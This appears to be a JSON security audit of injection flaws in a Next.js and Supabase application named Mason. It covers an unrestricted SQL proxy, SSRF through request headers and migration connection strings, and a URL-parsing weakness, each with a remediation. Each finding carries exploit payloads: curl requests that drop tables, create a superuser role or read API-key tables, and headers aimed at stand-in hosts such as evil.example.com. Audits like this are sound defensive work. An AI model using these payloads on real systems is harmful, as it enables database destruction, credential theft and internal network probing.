{
  "category": "injection",
  "analyzed_at": "2026-02-06T00:00:00Z",
  "findings": [
    {
      "id": "INJ-001",
      "type": "sql_injection",
      "severity": "critical",
      "confidence": "confirmed",
      "file": "src/app/api/supabase/projects/[ref]/query/route.ts",
      "line": 83,
      "vulnerable_code": "body: JSON.stringify({ query: body.query, read_only: body.read_only ?? false })",
      "description": "The SQL query proxy endpoint accepts arbitrary SQL from the request body and forwards it directly to the Supabase Management API's /database/query endpoint. There is no SQL validation, allowlist, or sanitization. Any authenticated user can execute arbitrary SQL (DDL, DML, DCL) against ANY Supabase project they have a valid OAuth Bearer token for. The body.query field is a raw string that gets passed through without inspection.",
      "exploit_payload": "DROP TABLE mason_users CASCADE; -- or: SELECT * FROM information_schema.tables; -- or: CREATE ROLE attacker WITH LOGIN SUPERUSER PASSWORD 'pwned';",
      "exploit_url": "curl -X POST 'https://<mason-host>/api/supabase/projects/<valid-20char-ref>/query' -H 'Authorization: Bearer <supabase-oauth-token>' -H 'Content-Type: application/json' -d '{\"query\": \"SELECT * FROM mason_api_keys; DROP TABLE mason_users CASCADE;\", \"read_only\": false}'",
      "impact": "Full database compromise. An authenticated user can: (1) read all data including API keys and credentials stored in mason_ai_provider_keys, (2) modify or delete any data, (3) create new database roles, (4) execute DDL to alter schema. The read_only flag is advisory and set by the client - there is no server-side enforcement. Even with read_only: true, the Supabase Management API may not enforce this depending on the project configuration.",
      "preconditions": "Attacker must have a valid session (authenticated via NextAuth/OAuth) AND a valid Supabase OAuth access token. The projectRef must pass the /^[a-z0-9-]{20,}$/ regex validation. This is a privilege escalation from 'authenticated user' to 'database admin'.",
      "remediation": "Implement a SQL allowlist that only permits specific query patterns (e.g., only SELECT on specific tables, only predefined migration SQL). Alternatively, remove this endpoint entirely and replace with specific typed API endpoints for each operation. At minimum, reject any SQL containing DDL keywords (DROP, CREATE, ALTER, GRANT, REVOKE) when read_only is true."
    },
    {
      "id": "INJ-002",
      "type": "ssrf",
      "severity": "high",
      "confidence": "confirmed",
      "file": "src/app/api/backlog/[id]/prd/route.ts",
      "line": 44,
      "vulnerable_code": "const supabase = createClient(supabaseUrl, supabaseAnonKey);",
      "description": "Multiple API endpoints (prd, events, risk-analysis, analyze-risk, restore) accept x-supabase-url and x-supabase-anon-key from request headers and use them directly to create a Supabase client. There is ZERO validation that the URL is a legitimate Supabase instance (e.g., *.supabase.co). An authenticated attacker can point these headers at any server they control, causing the Mason server to make authenticated requests to an attacker-controlled endpoint. This affects 5+ route files.",
      "affected_files": [
        "src/app/api/backlog/[id]/prd/route.ts",
        "src/app/api/backlog/[id]/events/route.ts",
        "src/app/api/backlog/[id]/risk-analysis/route.ts",
        "src/app/api/backlog/[id]/analyze-risk/route.ts",
        "src/app/api/backlog/restore/route.ts"
      ],
      "exploit_payload": "x-supabase-url: https://attacker-controlled-server.com\nx-supabase-anon-key: any-string-here",
      "exploit_url": "curl -X GET 'https://<mason-host>/api/backlog/<any-uuid>/prd' -H 'Cookie: <valid-session-cookie>' -H 'x-supabase-url: https://evil.example.com' -H 'x-supabase-anon-key: fake-key'",
      "impact": "Server-Side Request Forgery (SSRF). The Mason server will make HTTP requests to the attacker-controlled URL, potentially: (1) scanning internal network services accessible from the Mason server, (2) leaking internal network topology via error messages, (3) reading responses from internal services that trust the Mason server's IP. The Supabase JS client sends requests with the anon key in headers, which could leak the key to the attacker's server. Additionally, an attacker could set up a fake Supabase-compatible endpoint that returns crafted data to manipulate the application's behavior.",
      "preconditions": "Attacker must have a valid NextAuth session (authenticated via GitHub OAuth).",
      "remediation": "Validate x-supabase-url against a strict allowlist pattern (e.g., must match https://<project-ref>.supabase.co where project-ref is alphanumeric). Alternatively, store the user's Supabase URL server-side (tied to their session) rather than accepting it from request headers on every call."
    },
    {
      "id": "INJ-003",
      "type": "ssrf",
      "severity": "medium",
      "confidence": "confirmed",
      "file": "src/app/api/setup/migrations/route.ts",
      "line": 1012,
      "vulnerable_code": "const result = await runMigrations(supabaseUrl || '', databasePassword || '', MIGRATION_SQL, connectionString);",
      "description": "The migrations endpoint accepts supabaseUrl and connectionString from the POST request body. The supabaseUrl is used to build a PostgreSQL connection string via buildConnectionString() in pg-migrate.ts (line 32: `postgresql://postgres:${encodeURIComponent(databasePassword)}@db.${projectRef}.supabase.co:5432/postgres`). If connectionString is provided directly, it is used verbatim with no validation. An attacker can make the server connect to arbitrary PostgreSQL servers. The supabaseUrl is only loosely parsed (string replacement of 'https://' and '.supabase.co') and not validated against a strict pattern.",
      "exploit_payload": "POST body: {\"connectionString\": \"postgresql://postgres:password@internal-db.corp.local:5432/secrets\"} -- or: {\"supabaseUrl\": \"https://evil.supabase.co\", \"databasePassword\": \"test\"}",
      "exploit_url": "curl -X POST 'https://<mason-host>/api/setup/migrations' -H 'Cookie: <valid-session-cookie>' -H 'Content-Type: application/json' -d '{\"connectionString\": \"postgresql://postgres:test@10.0.0.1:5432/postgres\"}'",
      "impact": "The server will attempt a PostgreSQL connection to an attacker-specified host. This enables: (1) internal network port scanning (PostgreSQL port 5432 on internal hosts), (2) credential leakage if the Mason server is on an internal network, (3) potential exploitation of PostgreSQL servers on the internal network using the provided migration SQL. The migration SQL is hardcoded (safe) but the connection target is attacker-controlled.",
      "preconditions": "Attacker must have a valid NextAuth session (authenticated via GitHub OAuth). The connection attempt has a 10-second timeout.",
      "remediation": "Validate connectionString to only allow connections to *.supabase.co hosts. Validate supabaseUrl against a strict Supabase URL pattern. Block connections to RFC 1918 private IP ranges and localhost."
    },
    {
      "id": "INJ-004",
      "type": "ssrf",
      "severity": "low",
      "confidence": "suspected",
      "file": "src/lib/supabase/pg-migrate.ts",
      "line": 32,
      "vulnerable_code": "return `postgresql://postgres:${encodeURIComponent(databasePassword)}@db.${projectRef}.supabase.co:5432/postgres`;",
      "description": "The buildConnectionString function extracts projectRef from the supabaseUrl by stripping 'https://' and '.supabase.co'. If the supabaseUrl contains unexpected formatting (e.g., 'https://malicious-host.com/.supabase.co'), the projectRef extraction could produce a string that changes the connection target. However, the resulting hostname would be 'db.<extracted>.supabase.co' which limits exploitability since it remains under the supabase.co domain. The password is properly URI-encoded. This is low severity because the domain suffix is fixed to .supabase.co.",
      "exploit_payload": "supabaseUrl: 'https://x.supabase.co@evil.com/.supabase.co' -- after stripping, projectRef becomes 'x.supabase.co@evil.com/' which is further used in: db.x.supabase.co@evil.com/.supabase.co:5432",
      "exploit_url": "N/A - theoretical, constrained by .supabase.co domain suffix",
      "impact": "Limited. The fixed '.supabase.co' suffix constrains where connections can go. The main risk is DNS rebinding or subdomain takeover on supabase.co, which is outside the application's control.",
      "preconditions": "Attacker must have a valid NextAuth session. Requires a DNS configuration that resolves the crafted hostname.",
      "remediation": "Use a strict regex to validate supabaseUrl format: /^https:\\/\\/[a-z0-9-]+\\.supabase\\.co\\/?$/ before extracting projectRef. This prevents URL manipulation attacks."
    }
  ],
  "non_findings": [
    {
      "area": "Supabase JS Client queries",
      "assessment": "All Supabase JS client queries use parameterized .eq(), .filter(), .insert(), .update(), .upsert() methods. No string interpolation in query building. The TABLES constant is used consistently for table names. No SQL injection risk in application-level queries.",
      "files_checked": [
        "src/app/api/backlog/restore/route.ts",
        "src/app/api/backlog/[id]/prd/route.ts",
        "src/app/api/backlog/[id]/events/route.ts",
        "src/app/api/backlog/[id]/analyze-risk/route.ts",
        "src/app/api/backlog/[id]/risk-analysis/route.ts",
        "src/app/api/v1/backlog/next/route.ts",
        "src/app/api/v1/backlog/[id]/start/route.ts",
        "src/app/api/v1/backlog/[id]/complete/route.ts",
        "src/app/api/v1/backlog/[id]/fail/route.ts"
      ]
    },
    {
      "area": "Command injection",
      "assessment": "No exec(), spawn(), child_process, eval(), or Function() constructor usage found in the server-side codebase. No shell command execution from user input."
    },
    {
      "area": "Path traversal via [ref] parameter",
      "assessment": "All three [ref] route handlers (query, api-keys, project info) validate projectRef using validateProjectRef() which enforces /^[a-z0-9-]{20,}$/ regex. This effectively prevents path traversal (no slashes, dots, or special characters allowed). The validation is applied before the ref is used in URL construction."
    },
    {
      "area": "Path traversal via [id] parameters",
      "assessment": "The [id] route parameters in /api/backlog/[id]/* and /api/v1/backlog/[id]/* are used only as Supabase .eq('id', id) filter values. Since Supabase JS uses parameterized queries, malicious [id] values cannot cause SQL injection. Invalid UUIDs simply return no results."
    },
    {
      "area": "Template injection",
      "assessment": "No server-side template rendering with user input. Next.js handles template rendering safely via React's built-in XSS protection."
    },
    {
      "area": "Migration SQL static safety",
      "assessment": "The MIGRATION_SQL constant is a hardcoded string literal in the source code. It is not constructed from user input. The migration endpoint only runs this static SQL. No user-supplied SQL is mixed into migration execution."
    },
    {
      "area": "Request body validation",
      "assessment": "Several endpoints use Zod schema validation (backlogRestoreSchema, executionStartSchema, etc.) for type-safe input validation. However, many endpoints do manual validation (checking typeof, truthy checks) rather than Zod schemas."
    }
  ],
  "summary": {
    "total_findings": 4,
    "critical": 1,
    "high": 1,
    "medium": 1,
    "low": 1,
    "narrative": "The highest-risk finding is the SQL query proxy endpoint (INJ-001) which forwards arbitrary SQL to Supabase Management API with no content filtering. While it requires authentication (OAuth token), any authenticated user gains full database admin capabilities through this endpoint. The second major concern is the systematic lack of validation on x-supabase-url headers (INJ-002) across 5+ endpoints, enabling SSRF attacks from any authenticated user. The migration endpoint's acceptance of arbitrary connection strings (INJ-003) compounds the SSRF surface. Standard application queries via Supabase JS client are properly parameterized with no injection risks found."
  }
}
